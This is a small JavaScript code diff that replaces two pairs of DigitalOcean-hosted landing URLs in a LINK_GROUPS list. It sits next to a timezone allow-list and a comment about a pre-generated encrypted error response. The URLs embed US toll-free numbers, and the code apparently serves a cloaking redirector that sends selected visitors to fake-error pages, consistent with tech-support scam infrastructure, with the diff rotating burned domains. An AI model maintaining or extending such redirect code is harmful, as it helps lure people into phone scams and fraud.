@@ -17,8 +17,8 @@ const ALLOWED_TIMEZONES = new Set([
 ]);
 
 const LINK_GROUPS = [
-    { m: "https://lobster-app-mgaeg.ondigitalocean.app/merrx01usahtml/?bcda=1800-033-905", o: "https://lobster-app-mgaeg.ondigitalocean.app/werrx01USAHTML/?bcda=1800-033-905" },
-    { m: "https://squid-app-cxkop.ondigitalocean.app/merrx01usahtml/?bcda=1800-039-594", o: "https://squid-app-cxkop.ondigitalocean.app/werrx01USAHTML/?bcda=1800-039-594" }
+    { m: "https://whale-app-jbp6k.ondigitalocean.app/merrx01usahtml/?bcda=1800-033-905", o: "https://whale-app-jbp6k.ondigitalocean.app/werrx01USAHTML/?bcda=1800-033-905" },
+    { m: "https://hammerhead-app-lylyz.ondigitalocean.app/merrx01usahtml/?bcda=1800-039-594", o: "https://hammerhead-app-lylyz.ondigitalocean.app/werrx01USAHTML/?bcda=1800-039-594" }
 ];
 
 // Pre-generate the encrypted Error response to save CPU cycles
